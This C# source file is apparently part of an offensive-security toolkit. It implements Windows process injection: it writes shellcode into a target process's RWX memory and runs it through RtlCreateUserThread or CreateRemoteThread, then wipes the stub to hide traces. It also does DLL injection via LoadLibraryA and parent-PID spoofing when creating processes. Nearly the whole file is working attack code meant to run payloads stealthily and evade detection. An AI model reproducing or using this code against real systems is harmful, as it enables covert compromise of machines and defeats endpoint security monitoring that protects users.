using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Threading;

namespace Core.Injection
{

    // x64 m128a
    [StructLayout(LayoutKind.Sequential)]
    public struct M128A
    {
        public ulong High;
        public long Low;

        public override string ToString()
        {
            return string.Format("High:{0}, Low:{1}", this.High, this.Low);
        }
    }

    // x64 save format
    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    public struct XSAVE_FORMAT64
    {
        public ushort ControlWord;
        public ushort StatusWord;
        public byte TagWord;
        public byte Reserved1;
        public ushort ErrorOpcode;
        public uint ErrorOffset;
        public ushort ErrorSelector;
        public ushort Reserved2;
        public uint DataOffset;
        public ushort DataSelector;
        public ushort Reserved3;
        public uint MxCsr;
        public uint MxCsr_Mask;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public M128A[] FloatRegisters;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public M128A[] XmmRegisters;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
        public byte[] Reserved4;
    }
    public enum CONTEXT_FLAGS : uint
    {
        CONTEXT_i386 = 0x10000,
        CONTEXT_i486 = 0x10000,   //  same as i386
        CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
        CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
        CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
        CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
        CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
        CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
        CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
        CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
    }
    // x86 float save
    [StructLayout(LayoutKind.Sequential)]
    public struct FLOATING_SAVE_AREA
    {
        public uint ControlWord;
        public uint StatusWord;
        public uint TagWord;
        public uint ErrorOffset;
        public uint ErrorSelector;
        public uint DataOffset;
        public uint DataSelector;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
        public byte[] RegisterArea;
        public uint Cr0NpxState;
    }
    // x86 context structure (not used in this example)
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public uint ContextFlags; //set this to an appropriate value 
                                  // Retrieved by CONTEXT_DEBUG_REGISTERS 
        public uint Dr0;
        public uint Dr1;
        public uint Dr2;
        public uint Dr3;
        public uint Dr6;
        public uint Dr7;
        // Retrieved by CONTEXT_FLOATING_POINT 
        public FLOATING_SAVE_AREA FloatSave;
        // Retrieved by CONTEXT_SEGMENTS 
        public uint SegGs;
        public uint SegFs;
        public uint SegEs;
        public uint SegDs;
        // Retrieved by CONTEXT_INTEGER 
        public uint Edi;
        public uint Esi;
        public uint Ebx;
        public uint Edx;
        public uint Ecx;
        public uint Eax;
        // Retrieved by CONTEXT_CONTROL 
        public uint Ebp;
        public uint Eip;
        public uint SegCs;
        public uint EFlags;
        public uint Esp;
        public uint SegSs;
        // Retrieved by CONTEXT_EXTENDED_REGISTERS 
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
        public byte[] ExtendedRegisters;
    }
    // x64 context structure
    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    public struct CONTEXT64
    {
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;

        public CONTEXT_FLAGS ContextFlags;
        public uint MxCsr;

        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public ushort SegSs;
        public uint EFlags;

        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;

        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;

        public XSAVE_FORMAT64 DUMMYUNIONNAME;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
        public M128A[] VectorRegister;
        public ulong VectorControl;

        public ulong DebugControl;
        public ulong LastBranchToRip;
        public ulong LastBranchFromRip;
        public ulong LastExceptionToRip;
        public ulong LastExceptionFromRip;
    }
    [Flags]
    public enum ThreadAccess : int
    {
        TERMINATE = (0x0001),
        SUSPEND_RESUME = (0x0002),
        GET_CONTEXT = (0x0008),
        SET_CONTEXT = (0x0010),
        SET_INFORMATION = (0x0020),
        QUERY_INFORMATION = (0x0040),
        SET_THREAD_TOKEN = (0x0080),
        IMPERSONATE = (0x0100),
        DIRECT_IMPERSONATION = (0x0200),
        THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
        THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
    }
    [Flags]
    public enum ThreadAccess2 : int
    {
        TERMINATE = (0x0001),
        SUSPEND_RESUME = (0x0002),
        GET_CONTEXT = (0x0008),
        SET_CONTEXT = (0x0010),
        SET_INFORMATION = (0x0020),
        QUERY_INFORMATION = (0x0040),
        SET_THREAD_TOKEN = (0x0080),
        IMPERSONATE = (0x0100),
        DIRECT_IMPERSONATION = (0x0200)
    }
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    public class PPIDSpoofer
    {
        // Process privileges
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        // Memory permissions
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        // Import API Functions 
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        static extern int ResumeThread(IntPtr hThread);

        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsWow64Process([In] IntPtr processHandle,
        [Out, MarshalAs(UnmanagedType.Bool)] out bool wow64Process);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(
            string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
            IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        public static void InjectShellcode(int pid32, byte[] payload32)
        {

            IntPtr dwSize;
            Console.WriteLine(" > [+] Injecting into PID: " + pid32.ToString());
            IntPtr hProcess = Inject.OpenProcess(Inject.PROCESS_ALL_ACCESS, false, (uint)pid32);

            Console.WriteLine(" > [+] OpenProcess hProcess:  0x" + string.Format("{0:X8}", hProcess.ToInt64()));
            IntPtr hBaseAddress = Inject.VirtualAllocEx(hProcess, IntPtr.Zero, new IntPtr((uint)payload32.Length * 2), 0x3000, PPIDSpoofer.PAGE_EXECUTE_READWRITE);
            if (hBaseAddress == null)
            {
                Console.WriteLine(" > [-] VirtualAllocEx RWX: Failed");
            }
            else
            {
                Console.WriteLine(" > [+] VirtualAllocEx RWX: 0x" + string.Format("{0:X8}", hBaseAddress.ToInt64()));
            }
            bool success = Inject.WriteProcessMemory(hProcess, hBaseAddress, payload32, payload32.Length, out dwSize);
            if (success)
            {
                Console.WriteLine(" > [+] WriteProcessMemory: " + success.ToString());
                IntPtr tHandle = IntPtr.Zero;
                int hintThread = Inject.RtlCreateUserThread(hProcess, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, hBaseAddress, IntPtr.Zero, ref tHandle, IntPtr.Zero);

                if (hintThread != 0)
                {
                    IntPtr hptrThread = Inject.CreateRemoteThread(hProcess, IntPtr.Zero, 0, hBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
                    Console.WriteLine(" > [-] RtlCreateUserThread Failed - Failing over to CreateRemoteThread: " + hptrThread.ToString());
                    if (hptrThread == IntPtr.Zero)
                    {
                        Console.WriteLine(" > [-] CreateRemoteThread Failed - Failing over to CreateRemoteThread64: " + hptrThread.ToString());
                        IntPtr hptreThread = Util.CreateRemoteThread64((uint)hProcess.ToInt32(), (uint)hBaseAddress.ToInt32(), 0);
                    }
                    bool HandlehptrThread = Inject.CloseHandle(hptrThread);
                    Console.WriteLine(" > [+] CloseHandle to Inject Thread: " + HandlehptrThread.ToString());
                }
                else
                {
                    Console.WriteLine(" > [+] RtlCreateUserThread Injection: " + tHandle.ToString());
                    bool HandletHandle = Inject.CloseHandle(tHandle);
                    Console.WriteLine(" > [+] CloseHandle to Inject Thread: " + HandletHandle.ToString());
                }

            }
            else
            {
                Console.WriteLine(" > [-] WriteProcessMemory: " + success.ToString());
            }

            // wait for execution to start in the remote process then clear the shellcode stub in the remote process
            Thread.Sleep(10000);
            var overwriteData = new byte[payload32.Length];
            for (int i = 0; i < overwriteData.Length; i++)
            {
                overwriteData[i] = 0x00;
            }
            bool overwriteSuccess = Inject.WriteProcessMemory(hProcess, hBaseAddress, overwriteData, overwriteData.Length, out dwSize);
            if (overwriteSuccess)
            {
                Console.WriteLine(" > [-] Overwritten Memory Allocation with 0x00's: True");
            }
            bool VFree = Inject.VirtualFreeEx(hProcess, hBaseAddress, 0, Inject.FreeType.Release);
            if (!VFree)
            {
                Console.WriteLine(" > [-] VirtualFreeEx after 10 seconds: Failed");
            }
            else
            {
                Console.WriteLine(" > [+] VirtualFreeEx after 10 seconds: True");
            }

            bool HandlehProcess = Inject.CloseHandle(hProcess);
            Console.WriteLine(" > [+] Close handle Process: " + HandlehProcess.ToString());

            if (Marshal.GetLastWin32Error() != 0)
            {
                Console.WriteLine(" > LastError: " + Marshal.GetLastWin32Error());
            }

        }

        public static void InjectDLL(int pid32, string payload)
        {
            IntPtr dwSize;
            Console.WriteLine($" > [+] Injecting DLL ({payload}) into PID: " + pid32.ToString());

            IntPtr hProcess = Inject.OpenProcess(Inject.PROCESS_ALL_ACCESS, false, (uint)pid32);
            Console.WriteLine(" > [+] OpenProcess hProcess: " + hProcess.ToString());

            IntPtr allocMemAddress = Inject.VirtualAllocEx(hProcess, IntPtr.Zero, new IntPtr((payload.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            IntPtr TargetDLL = LoadLibrary("kernel32.dll");
            if (TargetDLL == IntPtr.Zero)
            {
                Console.WriteLine(" > [-] Error cannot find kernel32.dll");
            }
            IntPtr asbf = GetProcAddress(TargetDLL, "LoadLibraryA");

            Console.WriteLine(" > [+] VirtualAllocEx : {0:X}", allocMemAddress.ToInt64());

            IntPtr tHandle = IntPtr.Zero;
            bool success = Inject.WriteProcessMemory(hProcess, allocMemAddress, Encoding.Default.GetBytes(payload), ((payload.Length + 1) * Marshal.SizeOf(typeof(char))), out dwSize);

            Console.WriteLine(" > [+] CreateRemoteThread: " + asbf);
            IntPtr hptrThread = Inject.CreateRemoteThread(hProcess, IntPtr.Zero, 0, asbf, allocMemAddress, 0, IntPtr.Zero);

            if (hptrThread == null)
            {
                Console.WriteLine(" > [-] Error: CreateRemoteThread failed > LastError: " + Marshal.GetLastWin32Error());
            }

            Console.WriteLine(" > LastError: " + Marshal.GetLastWin32Error());

        }

        public static uint SharpCreateProcess(int parentProcessId, string lpApplicationName, bool Suspended, string pargs=null)
        {
            const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
            const uint CREATE_SUSPENDED = 0x00000004;
            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
            sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
            IntPtr lpValue = IntPtr.Zero;

            try
            {
                if (parentProcessId > 0)
                {
                    IntPtr lpSize = IntPtr.Zero;
                    bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);

                    sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                    success = InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);

                    IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
                    // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
                    lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(lpValue, parentHandle);

                    success = UpdateProcThreadAttribute(
                        sInfoEx.lpAttributeList,
                        0,
                        (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        lpValue,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero);
                }

                SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
                SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);
                if (Suspended && parentProcessId > 0)
                {
                    CreateProcess(lpApplicationName, pargs, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfoEx, out pInfo);
                }
                if (Suspended && parentProcessId == 0)
                {
                    CreateProcess(lpApplicationName, pargs, ref pSec, ref tSec, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfoEx, out pInfo);
                }
                if (!Suspended && parentProcessId > 0)
                {
                    CreateProcess(lpApplicationName, pargs, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
                }
                if (!Suspended && parentProcessId == 0)
                {
                    CreateProcess(lpApplicationName, pargs, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
                }
                //return pInfo.dwProcessId;
                return pInfo.dwProcessId;
            }
            finally
            {
                // Free the attribute list
                if (sInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                }
                Marshal.FreeHGlobal(lpValue);

                //    // Close process and thread handles
                //    if (pInfo.hProcess != IntPtr.Zero)
                //    {
                //        CloseHandle(pInfo.hProcess);
                //    }
                //    if (pInfo.hThread != IntPtr.Zero)
                //    {
                //        CloseHandle(pInfo.hThread);
                //    }
            }
        }

        public static PROCESS_INFORMATION CreateProcess(int parentProcessId, string lpApplicationName, bool Suspended)
        {
            const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
            const uint CREATE_SUSPENDED = 0x00000004;
            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
            sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
            IntPtr lpValue = IntPtr.Zero;

            try
            {
                if (parentProcessId > 0)
                {
                    IntPtr lpSize = IntPtr.Zero;
                    bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);

                    sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                    success = InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);

                    IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
                    // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
                    lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(lpValue, parentHandle);

                    success = UpdateProcThreadAttribute(
                        sInfoEx.lpAttributeList,
                        0,
                        (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        lpValue,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero);
                }

                SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
                SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);
                if (Suspended && parentProcessId > 0)
                {
                    CreateProcess(lpApplicationName, null, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfoEx, out pInfo);
                }
                if (Suspended && parentProcessId == 0)
                {
                    CreateProcess(lpApplicationName, null, ref pSec, ref tSec, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfoEx, out pInfo);
                }
                if (!Suspended && parentProcessId > 0)
                {
                    CreateProcess(lpApplicationName, null, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
                }
                if (!Suspended && parentProcessId == 0)
                {
                    CreateProcess(lpApplicationName, null, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
                }
                //return pInfo.dwProcessId;
                return pInfo;
            }
            finally
            {
                // Free the attribute list
                if (sInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                }
                Marshal.FreeHGlobal(lpValue);

                //    // Close process and thread handles
                //    if (pInfo.hProcess != IntPtr.Zero)
                //    {
                //        CloseHandle(pInfo.hProcess);
                //    }
                //    if (pInfo.hThread != IntPtr.Zero)
                //    {
                //        CloseHandle(pInfo.hThread);
                //    }
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

    }
    public class Inject
    {
        //QueueUserAPC
        [DllImport("kernel32.dll")] public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
        // VirtualProtecEx
        [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
        // VirtualAllocEx
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);
        // CreateRemoteThread
        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        // WriteProcessMemory
        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
        //[DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, int nSize, IntPtr lpNumberOfBytesWritten);
        // RtlFillMemory
        [DllImport("kernel32.dll")] public static extern void RtlFillMemory(IntPtr pDestination, IntPtr Length, byte Fill);
        // OpenProcess
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        // GetCurrentProcess
        [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
        // CloseHandle
        [DllImport("kernel32.dll")] [return: MarshalAs(UnmanagedType.Bool)] public static extern bool CloseHandle(IntPtr hObject);
        // OpenThread
        [DllImport("kernel32.dll", SetLastError = false)] public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
        // SuspendThread
        [DllImport("kernel32.dll", SetLastError = false)] public static extern uint SuspendThread(IntPtr hThread);
        // ResumeThread
        [DllImport("kernel32.dll")] public static extern uint ResumeThread(IntPtr hThread);
        // GetModuleHandle
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lpModuleName);
        // GetProcAddress
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        // memcpy
        [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)] public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UIntPtr count);
        // RtlCreateUserThread
        [DllImport("ntdll.dll")] public static extern int RtlCreateUserThread(IntPtr Process, IntPtr ThreadSecurityDescriptor, Boolean CreateSuspended, IntPtr ZeroBits, IntPtr MaximumStackSize, IntPtr CommittedStackSize, IntPtr StartAddress, IntPtr Parameter, ref IntPtr Thread, IntPtr ClientId);

        [Flags]
        public enum FreeType
        {
            Decommit = 0x4000,
            Release = 0x8000,
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, FreeType dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreateProcess(string lpApplicationName,
           string lpCommandLine, IntPtr lpProcessAttributes,
           IntPtr lpThreadAttributes,
           bool bInheritHandles, uint dwCreationFlags,
           IntPtr lpEnvironment, string lpCurrentDirectory,
           ref STARTUPINFO lpStartupInfo,
           out PROCESS_INFORMATION lpProcessInformation);

        // privileges
        public const uint PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFF;

        // used for memory allocation
        public const uint MEM_COMMIT = 0x00001000;
        public const uint MEM_RESERVE = 0x00002000;
        public const uint PAGE_READWRITE = 4;

        [Flags()]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags()]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }

        public const uint THREAD_SET_CONTEXT = 0x00000010;
        public const int THREAD_SET_CONTEXT2 = 0x00000010;
        public const int THREAD_SET_CONTEXT3 = 0x1f03ff;
        public const uint THREAD_SET_CONTEXT4 = 0x1f03ff;

        public const uint THREAD_ALL_ACCESS = 0x1f03ff;
        [Flags()]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200),
            THREAD_ALL_ACCESS = (0x1f03ff)
        }

    }


}
